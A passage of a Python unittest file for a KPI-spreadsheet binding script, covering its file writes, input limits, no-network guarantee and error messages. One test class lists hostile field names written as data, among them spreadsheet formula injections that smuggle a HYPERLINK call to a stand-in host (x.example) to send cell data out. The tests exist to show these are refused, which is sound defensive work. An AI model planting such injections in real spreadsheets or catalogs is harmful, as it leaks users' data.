"""Command line `main(argv, out, err)` of scripts/bind_kpi.py.

Every run goes through `run_cli`, which checks at the end of EVERY test that no traceback and no API key reached the
streams. The script has no network: `socket.socket`, the RPC client and the config loader are made to raise in
the happy-path tests. Big inputs are never real: the size limit is patched small and an endless file is a bounded
stand-in that raises on an unbounded read.
"""
import ast
import builtins
import contextlib
import hashlib
import importlib.util
import io
import json
import os
import socket
import subprocess
import sys
import unittest
from unittest import mock

import bind_fixtures as bf
from fake_odoo import FAKE_KEY
from helpers import REPO, IsolatedTestCase, ini_text, odoo_rpc

import bind_kpi
import intake_xlsx

POSIX_ONLY = unittest.skipIf(os.name == "nt", "symlinks / hard links need POSIX here")
AC7 = "write a requirement text for a developer and stop"
REPORT_KEYS = {"name", "lists", "pivots", "derived_cells", "bound_cells", "dash_cells", "helper_rows", "kept_typed",
               "out", "bytes", "sha256"}


def is_stdlib_module(name, use_names=True):
    """Whether `name` is a standard library module. `use_names=False` takes the branch of Python < 3.10 (no
    `sys.stdlib_module_names`) so that it can be exercised on a newer interpreter too."""
    if use_names and hasattr(sys, "stdlib_module_names"):                 # Python 3.10+
        return name in sys.stdlib_module_names
    spec = importlib.util.find_spec(name)                                 # older Pythons: lives next to `os`
    origin = getattr(spec, "origin", None)
    return bool(spec) and (origin in ("built-in", "frozen") or
                           (origin or "").startswith(os.path.dirname(os.__file__)))


class BindCliCase(IsolatedTestCase):
    def setUp(self):
        super().setUp()
        self.work = os.path.join(self.tmp, "work")
        os.makedirs(self.work)
        self.baseline_path = os.path.join(self.work, "baseline.json")
        self.spec_path = os.path.join(self.work, "spec.json")
        self.catalog_path = os.path.join(self.work, "catalog.json")
        self.out_path = os.path.join(self.work, "dashboard.json")
        self.baseline_bytes = intake_xlsx.dump_bytes(bf.small_baseline())
        self.write(self.baseline_path, self.baseline_bytes)
        self.write(self.spec_path, json.dumps(bf.make_spec()).encode("utf-8"))
        self.write(self.catalog_path, json.dumps(bf.small_catalog()).encode("utf-8"))
        self.streams = []
        self.addCleanup(self.check_streams)

    # ---- helpers
    @staticmethod
    def write(path, data):
        with open(path, "wb") as handle:
            handle.write(data if isinstance(data, bytes) else data.encode("utf-8"))

    def read(self, path=None):
        with open(path or self.out_path, "rb") as handle:
            return handle.read()

    def check_streams(self):
        for out, err in self.streams:
            self.assertNotIn(FAKE_KEY, out)
            self.assertNotIn(FAKE_KEY, err)
            self.assertNotIn("Traceback", err)
            self.assertNotIn("Traceback", out)

    def argv(self, *extra, catalog=True):
        base = ["--baseline", self.baseline_path, "--spec", self.spec_path, "--out", self.out_path]
        if catalog:
            base += ["--catalog", self.catalog_path]
        return base + list(extra)

    def run_cli(self, argv=None, out=None, err=None):
        out, err = out or io.StringIO(), err or io.StringIO()
        rc = bind_kpi.main(self.argv() if argv is None else argv, out, err)
        self.streams.append((out.getvalue(), err.getvalue()))
        return rc, out.getvalue(), err.getvalue()

    def expect_error(self, argv=None, rc=2, contains=()):
        """Run, expect `rc`, an empty stdout and ONE `error:` line; returns the line."""
        code, out, err = self.run_cli(argv)
        self.assertEqual(code, rc, err)
        self.assertEqual(out, "")
        self.assertEqual(len(err.splitlines()), 1, err)
        self.assertTrue(err.startswith("error: "), err)
        for text in ([contains] if isinstance(contains, str) else contains):
            self.assertIn(text, err)
        return err

    def leftovers(self):
        return sorted(name for name in os.listdir(self.work) if name.startswith(".intake-"))

    def listing(self):
        return sorted(os.listdir(self.work))


# ---------------------------------------------------------------- happy path

class HappyPathTests(BindCliCase):
    def test_the_report(self):
        rc, out, err = self.run_cli()
        self.assertEqual((rc, err), (0, ""))
        report = json.loads(out)
        self.assertEqual(set(report), REPORT_KEYS)
        data = self.read()
        self.assertEqual(report["name"], "Synthetic KPI board")
        self.assertEqual((report["lists"], report["bound_cells"], report["dash_cells"], report["helper_rows"],
                          report["kept_typed"]), (2, 6, 3, 1, 0))
        self.assertEqual((report["pivots"], report["derived_cells"]), (0, 0))        # a list-only spec
        self.assertEqual(report["out"], self.out_path)
        self.assertEqual(report["bytes"], len(data))
        self.assertEqual(report["sha256"], hashlib.sha256(data).hexdigest())
        self.assertTrue(out.endswith("}\n"))
        self.assertEqual(out.count("\n"), out.rstrip("\n").count("\n") + 1)

    def test_the_report_gives_the_out_path_as_it_was_typed(self):
        previous = os.getcwd()
        self.addCleanup(os.chdir, previous)
        os.chdir(self.work)
        argv = ["--baseline", "baseline.json", "--spec", "spec.json", "--out", "dashboard.json",
                "--catalog", "catalog.json"]
        rc, out, err = self.run_cli(argv)
        self.assertEqual((rc, err), (0, ""))
        self.assertEqual(json.loads(out)["out"], "dashboard.json")
        self.assertTrue(os.path.exists(self.out_path))

    def test_the_file_is_what_bind_gives_for_the_same_inputs(self):
        self.run_cli()
        document, _ = bind_kpi.bind(json.loads(self.baseline_bytes), bf.make_spec(), bf.small_catalog(),
                                    self.baseline_bytes)
        self.assertEqual(self.read(), intake_xlsx.dump_bytes(document))

    def test_a_second_run_with_force_is_byte_identical(self):
        _, first_out, _ = self.run_cli()
        first = self.read()
        rc, second_out, _ = self.run_cli(self.argv("--force"))
        self.assertEqual(rc, 0)
        self.assertEqual(first, self.read())
        self.assertEqual(json.loads(first_out)["sha256"], json.loads(second_out)["sha256"])

    def test_the_default_catalog_is_the_plugins_catalog(self):
        spec = bf.make_spec([{"cells": "D5:O5", "source": "production_group", "where": {"group_code": "DK_REF"},
                              "columns": "months"}])
        self.write(self.spec_path, json.dumps(spec))
        self.write(self.baseline_path, intake_xlsx.dump_bytes(bf.make_baseline(cells={})))
        rc, out, err = self.run_cli(self.argv(catalog=False))
        self.assertEqual((rc, err), (0, ""))
        document = json.loads(self.read())
        self.assertEqual(document["lists"]["1"]["model"], "dksk.kpi.production_group")

    def test_a_baseline_with_a_byte_order_mark_is_read(self):
        self.write(self.baseline_path, b"\xef\xbb\xbf" + self.baseline_bytes)
        self.write(self.spec_path, b"\xef\xbb\xbf" + json.dumps(bf.make_spec()).encode("utf-8"))
        self.write(self.catalog_path, b"\xef\xbb\xbf" + json.dumps(bf.small_catalog()).encode("utf-8"))
        rc, _, err = self.run_cli()
        self.assertEqual((rc, err), (0, ""))

    def test_the_output_is_utf8_lf(self):
        spec = bf.make_spec(year_filter_label="연도 Năm")
        self.write(self.spec_path, json.dumps(spec, ensure_ascii=False))
        self.run_cli()
        data = self.read()
        self.assertNotIn(b"\r", data)
        self.assertIn("연도 Năm".encode("utf-8"), data)
        self.assertTrue(data.endswith(b"\n"))

    def test_the_spec_hash_is_checked_against_the_baseline_file_bytes(self):
        digest = hashlib.sha256(self.baseline_bytes).hexdigest()
        self.write(self.spec_path, json.dumps(bf.make_spec(baseline_sha256=digest)))
        rc, _, err = self.run_cli()
        self.assertEqual((rc, err), (0, ""))
        os.unlink(self.out_path)
        self.write(self.baseline_path, self.baseline_bytes + b"\n")                  # same JSON, other bytes
        self.expect_error(contains=("sha256 differs", "run the intake again"))
        self.assertFalse(os.path.exists(self.out_path))

    def test_nothing_else_is_written_next_to_the_output(self):
        self.run_cli()
        self.assertEqual(self.listing(), ["baseline.json", "catalog.json", "dashboard.json", "spec.json"])


class NoNetworkTests(BindCliCase):
    def test_the_binder_never_touches_the_network_the_config_or_the_key(self):
        config_dir = os.path.join(self.home, ".config", "odoo-kpi")
        os.makedirs(config_dir)
        self.write(os.path.join(config_dir, "config.ini"), ini_text("http://127.0.0.1:1"))
        with mock.patch.object(socket, "socket", side_effect=AssertionError("network used")), \
                mock.patch.object(socket, "create_connection", side_effect=AssertionError("network used")), \
                mock.patch.object(odoo_rpc, "Client", side_effect=AssertionError("RPC client used")), \
                mock.patch.object(odoo_rpc, "load_config", side_effect=AssertionError("config read")):
            rc, out, err = self.run_cli()
        self.assertEqual((rc, err), (0, ""))
        self.assertNotIn(FAKE_KEY, out)
        self.assertNotIn("127.0.0.1", out)

    def test_the_module_imports_only_the_standard_library_and_the_two_sibling_scripts(self):
        with open(os.path.join(REPO, "scripts", "bind_kpi.py"), encoding="utf-8") as handle:
            tree = ast.parse(handle.read())
        names = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                names.update(alias.name.split(".")[0] for alias in node.names)
            elif isinstance(node, ast.ImportFrom):
                names.add((node.module or "").split(".")[0])
        # kpi_catalogs: the stdlib-only project selection (Plan kpi-multi-project step 2a, AC5); updated on purpose
        self.assertEqual({name for name in names if not is_stdlib_module(name)},
                         {"intake_xlsx", "kpi_catalogs", "validate_formulas"})
        self.assertFalse({"socket", "urllib", "http", "requests", "ssl", "odoo_rpc"} & names)

    def test_the_stdlib_check_gives_the_same_answer_on_both_of_its_branches(self):
        # the branch for Python < 3.10 (a module that lives next to `os`) never runs on a newer interpreter, so run
        # it here on purpose: it must classify the real imports of the script and the two sibling scripts alike
        stdlib = ("argparse", "ast", "hashlib", "json", "math", "os", "re", "sys", "tempfile", "time", "socket",
                  "unittest", "importlib", "_json", "io")
        ours = ("intake_xlsx", "validate_formulas", "odoo_rpc", "bind_fixtures", "helpers", "fake_odoo")
        for use_names in (True, False):
            with self.subTest(use_names=use_names):
                self.assertEqual([name for name in stdlib if not is_stdlib_module(name, use_names)], [])
                self.assertEqual([name for name in ours if is_stdlib_module(name, use_names)], [])
        self.assertFalse(is_stdlib_module("no_such_module_anywhere", False))

    def test_the_old_python_branch_really_looks_the_module_up_on_disk(self):
        # without this, a check that silently ignored `use_names=False` would make the test above compare a branch
        # with itself
        with mock.patch.object(importlib.util, "find_spec", wraps=importlib.util.find_spec) as lookup:
            is_stdlib_module("json", use_names=False)
        lookup.assert_called_once_with("json")
        if hasattr(sys, "stdlib_module_names"):
            with mock.patch.object(importlib.util, "find_spec", side_effect=AssertionError("looked up")):
                self.assertTrue(is_stdlib_module("json"))
                self.assertFalse(is_stdlib_module("intake_xlsx"))


# ---------------------------------------------------------------- the write path (shared with the intake)

class WritePathTests(BindCliCase):
    def test_an_existing_output_is_refused_without_force_and_left_alone(self):
        self.write(self.out_path, b"old output")
        self.expect_error(contains=("exists already", "--force"))
        self.assertEqual(self.read(), b"old output")
        self.assertEqual(self.leftovers(), [])

    def test_force_replaces_it(self):
        self.write(self.out_path, b"old output")
        rc, _, err = self.run_cli(self.argv("--force"))
        self.assertEqual((rc, err), (0, ""))
        self.assertNotEqual(self.read(), b"old output")
        self.assertEqual(self.leftovers(), [])

    def test_the_output_folder_must_exist(self):
        argv = self.argv()
        argv[argv.index("--out") + 1] = os.path.join(self.work, "missing", "dashboard.json")
        self.expect_error(argv, contains="the folder of --out does not exist")

    def assert_input_untouched(self):
        self.assertEqual(self.read(self.baseline_path), self.baseline_bytes)
        self.assertEqual(self.leftovers(), [])

    def test_out_equal_to_the_baseline_is_refused_with_and_without_force(self):
        for extra in ((), ("--force",)):
            with self.subTest(extra=extra):
                argv = self.argv(*extra)
                argv[argv.index("--out") + 1] = self.baseline_path
                self.expect_error(argv, contains="--out is the input file")
                self.assert_input_untouched()

    def test_out_spelled_another_way_is_still_the_baseline(self):
        spellings = [os.path.join(self.work, ".", "baseline.json"),
                     os.path.join(self.work, "sub", "..", "baseline.json"),
                     self.baseline_path.replace("/work/", "//work//") if os.sep == "/" else self.baseline_path]
        os.makedirs(os.path.join(self.work, "sub"))
        for spelling in spellings:
            with self.subTest(spelling=spelling):
                argv = self.argv("--force")
                argv[argv.index("--out") + 1] = spelling
                self.expect_error(argv, contains="--out is the input file")
                self.assert_input_untouched()

    def test_out_given_relative_to_the_working_folder_is_still_the_baseline(self):
        previous = os.getcwd()
        self.addCleanup(os.chdir, previous)
        os.chdir(self.work)
        argv = self.argv("--force")
        argv[argv.index("--out") + 1] = "baseline.json"
        argv[argv.index("--baseline") + 1] = "./baseline.json"
        self.expect_error(argv, contains="--out is the input file")
        self.assert_input_untouched()

    @POSIX_ONLY
    def test_out_that_is_a_symlink_to_the_baseline_is_refused(self):
        link = os.path.join(self.work, "link.json")
        os.symlink(self.baseline_path, link)
        argv = self.argv("--force")
        argv[argv.index("--out") + 1] = link
        self.expect_error(argv, contains="--out is the input file")
        self.assert_input_untouched()
        self.assertTrue(os.path.islink(link))

    @POSIX_ONLY
    def test_out_that_is_a_hard_link_of_the_baseline_is_refused(self):
        link = os.path.join(self.work, "hard.json")
        os.link(self.baseline_path, link)
        argv = self.argv("--force")
        argv[argv.index("--out") + 1] = link
        self.expect_error(argv, contains="--out is the input file")
        self.assert_input_untouched()

    @POSIX_ONLY
    def test_the_baseline_given_through_a_symlink_is_still_the_baseline(self):
        link = os.path.join(self.work, "link.json")
        os.symlink(self.baseline_path, link)
        argv = self.argv("--force")
        argv[argv.index("--baseline") + 1] = link
        argv[argv.index("--out") + 1] = self.baseline_path
        self.expect_error(argv, contains="--out is the input file")
        self.assert_input_untouched()

    def test_a_write_error_is_a_clean_error_and_leaves_no_temporary_file(self):
        with mock.patch.object(os, "replace", side_effect=OSError(28, "No space left on device")):
            self.expect_error(contains=("cannot write", "No space left"))
        self.assertEqual(self.leftovers(), [])
        self.assertFalse(os.path.exists(self.out_path))

    def test_a_failed_bind_writes_nothing_and_keeps_an_existing_output(self):
        spec = bf.make_spec([{"cells": "D5:F5", "source": "no_such_source", "columns": "months"}])
        self.write(self.spec_path, json.dumps(spec))
        self.expect_error(contains=AC7)
        self.assertFalse(os.path.exists(self.out_path))
        self.assertEqual(self.leftovers(), [])
        self.write(self.out_path, b"old output")
        self.expect_error(self.argv("--force"), contains=AC7)
        self.assertEqual(self.read(), b"old output")
        self.assertEqual(self.leftovers(), [])


# ---------------------------------------------------------------- input files

class InputFileTests(BindCliCase):
    def swap(self, which, data):
        self.write({"baseline": self.baseline_path, "spec": self.spec_path, "catalog": self.catalog_path}[which], data)

    def test_a_missing_file_is_a_clean_error(self):
        for which, path in (("baseline", self.baseline_path), ("spec", self.spec_path),
                            ("catalog", self.catalog_path)):
            with self.subTest(which=which):
                os.rename(path, path + ".moved")
                err = self.expect_error(contains=("cannot read the %s" % which, "No such file"))
                self.assertNotIn(self.tmp, err.replace(path, ""))             # only the reason, no path of the work folder
                os.rename(path + ".moved", path)
        self.assertFalse(os.path.exists(self.out_path))

    def test_a_directory_is_not_a_readable_file(self):
        for which in ("baseline", "spec", "catalog"):
            with self.subTest(which=which):
                path = {"baseline": self.baseline_path, "spec": self.spec_path, "catalog": self.catalog_path}[which]
                os.rename(path, path + ".moved")
                os.mkdir(path)
                self.expect_error(contains="cannot read the %s" % which)
                os.rmdir(path)
                os.rename(path + ".moved", path)

    def small_limit(self):
        """A patched MAX_FILE above the size of every real input file of the test (a stand-in is never big)."""
        return max(len(self.read(p)) for p in (self.baseline_path, self.spec_path, self.catalog_path)) + 10

    def test_a_file_over_the_size_limit_is_refused_for_each_input(self):
        limit = self.small_limit()
        for which in ("baseline", "spec", "catalog"):
            with self.subTest(which=which), mock.patch.object(bind_kpi, "MAX_FILE", limit):
                saved = {k: self.read(p) for k, p in (("baseline", self.baseline_path), ("spec", self.spec_path),
                                                      ("catalog", self.catalog_path))}
                self.swap(which, b"{" + b" " * limit + b"}")                       # limit + 2 bytes
                self.expect_error(contains=("the %s is larger than" % which))
                for k, data in saved.items():
                    self.swap(k, data)

    def test_a_file_exactly_at_the_limit_is_read(self):
        limit = self.small_limit()
        padded = b'{"sheets": []}' + b" " * (limit - len(b'{"sheets": []}'))
        self.assertEqual(len(padded), limit)
        with mock.patch.object(bind_kpi, "MAX_FILE", limit):
            self.swap("baseline", padded)
            err = self.expect_error(contains="exactly one sheet")
            self.assertNotIn("larger", err)
            self.swap("baseline", padded + b" ")
            self.expect_error(contains="the baseline is larger than")

    def test_an_endless_file_is_read_with_a_bound_and_refused(self):
        limit = self.small_limit()
        asked = []

        class Endless:
            """Serves exactly the number of bytes asked; an unbounded read is a test failure, never a hang."""

            def __enter__(self):
                return self

            def __exit__(self, *exc_info):
                return False

            def read(self, size=-1):
                asked.append(size)
                if size is None or size < 0 or size > limit + 1:
                    raise AssertionError("an unbounded or oversized read: %r" % size)
                return b" " * size

        real_open = builtins.open
        for which in ("baseline", "spec", "catalog"):
            target = {"baseline": self.baseline_path, "spec": self.spec_path, "catalog": self.catalog_path}[which]
            del asked[:]

            def fake_open(path, *args, **kwargs):
                return Endless() if path == target else real_open(path, *args, **kwargs)

            with self.subTest(which=which), mock.patch.object(bind_kpi, "MAX_FILE", limit), \
                    mock.patch.object(bind_kpi, "open", fake_open, create=True):
                self.expect_error(contains="the %s is larger than" % which)
                self.assertEqual(asked, [limit + 1])

    def test_content_that_is_not_json_is_refused_for_each_input(self):
        bad = [b"hello", b"", b"   ", b"{", b'{"a": }', b"\xff\xfe\x00", b"NaN", b"[NaN]", b'{"sheets": Infinity}',
               b"-Infinity", b'{"a": 1}{"b": 2}', b"'single'", b"\x00"]
        for which in ("baseline", "spec", "catalog"):
            for data in bad:
                with self.subTest(which=which, data=data):
                    saved = self.read({"baseline": self.baseline_path, "spec": self.spec_path,
                                       "catalog": self.catalog_path}[which])
                    self.swap(which, data)
                    self.expect_error(contains="the %s is not valid JSON" % which)
                    self.swap(which, saved)
        self.assertFalse(os.path.exists(self.out_path))

    def test_deeply_nested_json_is_a_clean_error_for_each_input(self):
        nested = b"[" * 100000 + b"]" * 100000
        for which in ("baseline", "spec", "catalog"):
            with self.subTest(which=which):
                saved = self.read({"baseline": self.baseline_path, "spec": self.spec_path,
                                   "catalog": self.catalog_path}[which])
                self.swap(which, nested)
                self.expect_error(contains="the %s is not valid JSON" % which)
                self.swap(which, saved)

    def test_read_json_raises_bind_error_for_deep_nesting(self):
        path = os.path.join(self.work, "nested.json")
        self.write(path, b"[" * 100000 + b"]" * 100000)
        with self.assertRaises(bind_kpi.BindError):
            bind_kpi._read_json(path, "the thing")

    def test_json_of_the_wrong_kind_is_refused(self):
        self.swap("baseline", b"[]")
        self.expect_error(contains="exactly one sheet")
        self.swap("baseline", self.baseline_bytes)
        for data in (b"[]", b'"x"', b"5", b"null"):
            with self.subTest(spec=data):
                self.swap("spec", data)
                self.expect_error(contains="known keys")

    def test_a_bad_catalog_shape_is_refused(self):
        good = bf.small_catalog()
        for catalog in ([], "x", None, 5, {}, {"schema": 1}, {"schema": 2, "sources": good["sources"]},
                        {"schema": "1", "sources": good["sources"]}, {"schema": 1, "sources": {}},
                        {"schema": 1, "sources": []}, {"schema": 1, "sources": "x"},
                        {"sources": good["sources"]}):
            with self.subTest(catalog=str(catalog)[:40]):
                self.swap("catalog", json.dumps(catalog))
                self.expect_error(contains="the catalog has an unexpected shape")

    def test_the_catalog_loader(self):
        self.assertIn("production_group", bind_kpi.load_catalog(project="dksk")["sources"])
        self.assertEqual(sorted(bind_kpi.load_catalog(self.catalog_path)["sources"]), sorted(bf.small_catalog()["sources"]))
        with self.assertRaises(bind_kpi.BindError):
            bind_kpi.load_catalog(os.path.join(self.work, "nothing.json"))


class CatalogIdentifierTests(BindCliCase):
    """Combined security review M3: the names a catalog gives for columns, measures and the date field are written INTO
    formulas (`ODOO.LIST(1,1,"<column>")`, `ODOO.PIVOT(1,"<measure>","<date field>:month",...)`), so `load_catalog`
    accepts only plain (dotted) field names: a catalog given with `--catalog` cannot put a quote or a call into a cell."""
    HOSTILE_TEXT = ('x"', "a b", "a(b)", 'HYPERLINK("https://x.example")', "", " x", "x ", "x\n", "\nx", "1x", ".x",
                    "-x", "x-y", "tháng_1", "\N{LATIN CAPITAL LETTER E WITH ACUTE}", "x\N{ZERO WIDTH SPACE}", "x'", "x;y",
                    "x,y", "x/y", "x$", "x:month", "x\x00",
                    'x"),HYPERLINK("https://x.example/?d="&ODOO.LIST(1,1,"x', "x\N{KELVIN SIGN}",
                    "\N{FULLWIDTH LATIN CAPITAL LETTER A}", "x\N{ZERO WIDTH NO-BREAK SPACE}",
                    # one stray character each, so that a pattern widened by a single character is seen
                    "x(", "x)", "(x", "x!", "x&", "x+", "x=", "x\\", "x[", "x]", "x{", "x}", "x<", "x>", "x*", "x^",
                    "x~", "x|", "x?", "x@", "x#", "x%", "x\t", "x\r", "x\N{NO-BREAK SPACE}")
    HOSTILE_OTHER = (5, None, True, 1.5, ["x"], {"x": 1})
    GOOD = ("x", "_x", "month_1", "a.b", "A1", "x9", "qty", "__count", "a.b.c", "X")
    MESSAGE = "the catalog source %r holds a name that is not a plain field name: %r"

    def swap(self, which, data):
        self.write(self.catalog_path, data)

    def load(self, catalog):
        path = os.path.join(self.work, "load-catalog.json")
        self.write(path, json.dumps(catalog))
        return bind_kpi.load_catalog(path)

    def refused(self, catalog):
        with self.assertRaises(bind_kpi.BindError) as ctx:
            self.load(catalog)
        return str(ctx.exception)

    @staticmethod
    def lists():
        return json.loads(json.dumps(bf.small_catalog()))

    @staticmethod
    def pivots():
        return json.loads(json.dumps(bf.pivot_catalog()))

    def test_plain_field_names_are_accepted_in_every_position(self):
        catalog = self.pivots()
        catalog["sources"]["hist"].update({"date_field": self.GOOD[3], "measures": list(self.GOOD)})
        catalog["sources"]["plain"]["value_columns"] = sorted(self.GOOD)
        self.assertEqual(self.load(catalog), catalog)

    def test_the_real_catalog_loads_and_holds_only_plain_names(self):
        catalog = bind_kpi.load_catalog(project="dksk")
        names = 0
        for source in catalog["sources"].values():
            values = [source["date_field"]] + source["measures"] if source.get("kind") == "pivot" \
                else source["value_columns"]
            names += len(values)
            for value in values:
                self.assertRegex(value, r"\A[A-Za-z_][A-Za-z0-9_.]*\Z")
        self.assertGreater(names, 30)

    def test_a_hostile_list_column_is_refused_in_any_position(self):
        for value in self.HOSTILE_TEXT + self.HOSTILE_OTHER:
            for index in (0, 1, 2):
                with self.subTest(value=value, index=index):
                    catalog = self.lists()
                    columns = ["m1", "m2", "m3"]
                    columns[index] = value
                    catalog["sources"]["plain"]["value_columns"] = columns
                    self.assertEqual(self.refused(catalog), self.MESSAGE % ("plain", str(value)[:40]))

    def test_a_hostile_pivot_measure_is_refused_in_any_position(self):
        for value in self.HOSTILE_TEXT + self.HOSTILE_OTHER:
            for index in (0, 1, 2):
                with self.subTest(value=value, index=index):
                    catalog = self.pivots()
                    measures = ["__count", "qty", "ng_qty"]
                    measures[index] = value
                    catalog["sources"]["hist"]["measures"] = measures
                    self.assertEqual(self.refused(catalog), self.MESSAGE % ("hist", str(value)[:40]))

    def test_a_hostile_pivot_date_field_is_refused(self):
        for value in self.HOSTILE_TEXT:
            with self.subTest(value=value):
                catalog = self.pivots()
                catalog["sources"]["other"]["date_field"] = value
                self.assertEqual(self.refused(catalog), self.MESSAGE % ("other", str(value)[:40]))
        for value in self.HOSTILE_OTHER:                   # not a string: refused by the shape check before that
            with self.subTest(value=value):
                catalog = self.pivots()
                catalog["sources"]["other"]["date_field"] = value
                self.assertIn("the catalog source 'other'", self.refused(catalog))

    def test_every_source_is_checked_not_only_the_first_of_each_kind(self):
        for kind, name, key in (("lists", "wide", "value_columns"), ("pivots", "longp", "measures"),
                                ("pivots", "vault", "date_field")):
            with self.subTest(source=name):
                catalog = getattr(self, kind)()
                catalog["sources"][name][key] = 'x"' if key == "date_field" else ['x"']
                self.assertEqual(self.refused(catalog), self.MESSAGE % (name, 'x"'))

    def test_the_message_names_the_source_and_never_prints_a_long_value_whole(self):
        long_value = 'qqqqq"' + "z" * 300
        catalog = self.lists()
        catalog["sources"]["secret"]["value_columns"] = ["m1", long_value]
        message = self.refused(catalog)
        self.assertEqual(message, self.MESSAGE % ("secret", long_value[:40]))
        self.assertIn("z" * 34, message)
        self.assertNotIn("z" * 35, message)
        catalog = self.lists()
        catalog["sources"]["n" * 100] = catalog["sources"].pop("plain")
        catalog["sources"]["n" * 100]["value_columns"] = ['x"']
        message = self.refused(catalog)
        self.assertIn("n" * 40, message)
        self.assertNotIn("n" * 41, message)

    # ---- the command line (`--catalog`)
    def hostile_catalog(self):
        catalog = self.lists()
        catalog["sources"]["plain"]["value_columns"] = ["m1", "m2", "m3"]
        catalog["sources"]["plain"]["column_groups"] = {"months": ["m1", "m2", 'm3"),HYPERLINK("https://x.example/?d="'
                                                                  '&ODOO.LIST(1,1,"x']}
        catalog["sources"]["plain"]["value_columns"] = sorted(catalog["sources"]["plain"]["column_groups"]["months"])
        return catalog

    def test_the_catalog_option_refuses_a_hostile_name_and_writes_nothing(self):
        before = self.listing()
        pivot_measure, pivot_date = self.pivots(), self.pivots()
        pivot_measure["sources"]["hist"]["measures"] = ["__count", 'qty"),HYPERLINK("https://x.example/?d="&1,"y']
        pivot_date["sources"]["other"]["date_field"] = 'when"),HYPERLINK("https://x.example")+IFERROR(0,"'
        for label, catalog, tail in (("list column", self.hostile_catalog(), "ODOO.LIST(1,1"),
                                     ("pivot measure", pivot_measure, '&1,"y'),
                                     ("pivot date field", pivot_date, "IFERROR(0")):
            with self.subTest(label=label):
                self.swap("catalog", json.dumps(catalog))
                err = self.expect_error(contains=("the catalog source", "not a plain field name"))
                self.assertNotIn(tail, err)                   # the value is cut at 40 characters, not echoed whole
                self.assertEqual(self.listing(), before)
                self.assertFalse(os.path.exists(self.out_path))

    def test_the_catalog_option_names_the_source_of_the_hostile_name(self):
        self.swap("catalog", json.dumps(self.hostile_catalog()))
        self.expect_error(contains="the catalog source 'plain' holds a name that is not a plain field name")

    def test_a_hostile_name_in_a_source_the_spec_does_not_use_is_refused_too(self):
        catalog = self.lists()
        catalog["sources"]["wide"]["value_columns"] = ["c000", 'c001"']
        self.swap("catalog", json.dumps(catalog))
        self.expect_error(contains="the catalog source 'wide' holds a name")
        self.assertFalse(os.path.exists(self.out_path))

    def test_the_same_catalog_with_plain_names_is_accepted_through_the_command_line(self):
        catalog = self.hostile_catalog()
        catalog["sources"]["plain"]["column_groups"] = {"months": ["m1", "m2", "m3"]}
        catalog["sources"]["plain"]["value_columns"] = ["m1", "m2", "m3"]
        self.swap("catalog", json.dumps(catalog))
        rc, out, err = self.run_cli()
        self.assertEqual((rc, err), (0, ""))
        self.assertTrue(os.path.exists(self.out_path))


class ArgumentTests(BindCliCase):
    def exits(self, argv):
        err = io.StringIO()
        with contextlib.redirect_stderr(err), self.assertRaises(SystemExit) as ctx:
            bind_kpi.main(argv, io.StringIO(), io.StringIO())
        return ctx.exception.code, err.getvalue()

    def test_every_required_option_is_required(self):
        full = self.argv()
        for flag in ("--baseline", "--spec", "--out"):
            with self.subTest(flag=flag):
                argv = list(full)
                index = argv.index(flag)
                del argv[index:index + 2]
                code, err = self.exits(argv)
                self.assertEqual(code, 2)
                self.assertIn(flag, err)
                self.assertNotIn("Traceback", err)
        self.assertFalse(os.path.exists(self.out_path))

    def test_an_unknown_option_is_refused(self):
        code, err = self.exits(self.argv("--no-such-option"))
        self.assertEqual(code, 2)
        self.assertFalse(os.path.exists(self.out_path))

    def test_the_option_set_is_exact_and_an_abbreviation_is_refused_with_a_usage_error_and_nothing_written(self):
        # Review finding: argparse prefix matching let `--proj dksk` / `--cat x` pass as `--project` / `--catalog`
        options = {opt for action in bind_kpi.build_parser()._actions for opt in action.option_strings}
        self.assertEqual(options, {"-h", "--help", "--baseline", "--spec", "--out", "--project", "--catalog", "--force"})
        for extra in (["--proj", "dksk"], ["--cat", "x"], ["--forc"], ["--proj=dksk"], ["--cat=x"]):
            with self.subTest(extra=extra):
                code, err = self.exits(self.argv(*extra, catalog=False))
                self.assertEqual(code, 2)
                self.assertIn("unrecognized arguments", err)
                self.assertIn("usage:", err)
                self.assertNotIn("Traceback", err)
                self.assertEqual(self.listing(), ["baseline.json", "catalog.json", "spec.json"])

    def test_help_exits_zero_and_names_the_options(self):
        out = io.StringIO()
        with contextlib.redirect_stdout(out), self.assertRaises(SystemExit) as ctx:
            bind_kpi.main(["--help"], io.StringIO(), io.StringIO())
        self.assertEqual(ctx.exception.code, 0)
        for flag in ("--baseline", "--spec", "--out", "--catalog", "--force"):
            self.assertIn(flag, out.getvalue())


class GuardMessagesThroughTheCliTests(BindCliCase):
    def test_an_unknown_source_stops_with_the_requirement_text_sentence(self):
        spec = bf.make_spec([{"cells": "D5:F5", "source": "new_view", "columns": "months"}])
        self.write(self.spec_path, json.dumps(spec))
        err = self.expect_error(contains=(AC7, "not in the catalog"))
        self.assertIn("binding 1", err)
        self.assertFalse(os.path.exists(self.out_path))

    def test_a_label_shift_and_a_typed_leftover_are_one_line_errors(self):
        self.write(self.spec_path, json.dumps(bf.make_spec(labels={"A5": "Row label two"})))
        self.expect_error(contains="label shift")
        self.write(self.spec_path, json.dumps(bf.make_spec()))
        self.write(self.baseline_path, intake_xlsx.dump_bytes(bf.edit(bf.small_baseline(), {"H8": {"content": "7"}})))
        self.expect_error(contains=("typed numbers left", "H8"))
        self.assertFalse(os.path.exists(self.out_path))

    def test_a_malformed_label_address_is_a_clean_error(self):
        self.write(self.spec_path, json.dumps(bf.make_spec(labels={"a5": "x"})))
        self.expect_error(contains="not a cell reference")

    def test_a_multi_line_value_never_breaks_the_one_line_rule(self):
        spec = bf.make_spec([{"cells": "D5:F5", "source": "x\ny\nz", "columns": "months"}])
        self.write(self.spec_path, json.dumps(spec))
        self.expect_error(contains=AC7)
        self.write(self.spec_path, json.dumps(bf.make_spec(labels={"A5": "a\nb\nc"})))
        self.expect_error(contains="label shift")

    def test_the_last_resort_handler_prints_the_class_only(self):
        with mock.patch.object(bind_kpi, "bind", side_effect=RuntimeError("secret detail /home/user")):
            rc, out, err = self.run_cli()
        self.assertEqual((rc, out, err), (1, "", "error: unexpected RuntimeError\n"))
        self.assertFalse(os.path.exists(self.out_path))

    def test_a_recursion_error_is_a_clean_error(self):
        with mock.patch.object(bind_kpi, "bind", side_effect=RecursionError()):
            rc, out, err = self.run_cli()
        self.assertEqual((rc, out, err), (2, "", "error: the input is nested too deeply\n"))

    def test_the_other_error_classes_exit_2(self):
        for exc in (bind_kpi.BindError("a bind problem"), intake_xlsx.IntakeError("an intake problem"),
